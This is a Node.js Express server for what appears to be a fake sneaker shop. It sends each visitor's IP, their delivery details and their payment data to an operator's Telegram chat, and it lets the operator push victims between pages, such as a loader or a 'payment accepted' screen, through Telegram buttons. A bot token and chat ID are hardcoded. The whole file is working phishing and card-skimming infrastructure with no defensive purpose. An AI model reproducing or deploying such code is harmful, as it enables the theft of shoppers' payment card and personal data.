const express = require("express");
const fetch = require("node-fetch");
const path = require("path");

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "frontend")));

const BOT_TOKEN = "8208574276:AAF96EdGjUrQqkRrb31QjzqzqVJ9uMB5c";
const CHAT_ID = "7747778364";
const BASE_URL = "https://monsitebot-1.onrender.com";

let userCommands = {};
let userData = {};

async function sendTelegramMessage(text, keyboard) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: "HTML",
      reply_markup: keyboard,
    }),
  });
}

app.post("/visit", async (req, res) => {
  const { visitorId, page } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  const keyboard = {
    inline_keyboard: [[
      { text: "🏠 Accueil", callback_data: `index_${visitorId}` },
      { text: "ℹ️ Info", callback_data: `info_${visitorId}` },
      { text: "📞 Contact", callback_data: `contact_${visitorId}` },
      { text: "👀 Visite", callback_data: `visite_${visitorId}` }
    ]]
  };

  const message = `👤 <b>Nouveau visiteur</b>\n🆔 ID: ${visitorId}\n🌍 IP: ${ip}\n📄 Page: ${page}`;
  await sendTelegramMessage(message, keyboard);

  res.json({ success: true });
});

app.post("/submit", async (req,res)=>{
  const { visitorId, type, data } = req.body;
  if(!userData[visitorId]) userData[visitorId]={};

  if(type==='pair') userData[visitorId].pair=data.pair;
  if(type==='info') userData[visitorId]={...userData[visitorId], ...data};
  if(type==='payment') userData[visitorId].payment=data.payment;

  let message=`👤 Visitor ID: ${visitorId}\n`;
  if(type==='pair') message+=`🏀 Paire choisie: ${data.pair}`;
  if(type==='info') message+=`📦 Infos livraison: ${JSON.stringify(data)}`;
  if(type==='payment') message+=`💳 Paiement: ${JSON.stringify(data)}`;

  const keyboard={inline_keyboard:[[ 
    {text:"🏠 Accueil",callback_data:`index_${visitorId}`},
    {text:"Loader",callback_data:`loader_${visitorId}`},
    {text:"Paiement accepté",callback_data:`paymentok_${visitorId}`}
  ]]};
  await sendTelegramMessage(message,keyboard);
  res.json({success:true});
});

app.get("/get-command",(req,res)=>{
  const { visitorId } = req.query;
  const cmd=userCommands[visitorId]||null;
  if(cmd) delete userCommands[visitorId];
  res.json({command:cmd});
});

app.post("/webhook",async(req,res)=>{
  const cb=req.body.callback_query;
  if(!cb) return res.sendStatus(200);
  const [page,visitorId]=cb.data.split("_");
  userCommands[visitorId]=page;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({callback_query_id:cb.id,text:`➡️ Page: ${page}`})
  });
  res.sendStatus(200);
});

const PORT=process.env.PORT||3000;
app.listen(PORT,async()=>{
  console.log(`✅ Serveur actif sur le port ${PORT}`);
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${BASE_URL}/webhook`);
  console.log("📡 Webhook Telegram configuré !");
});
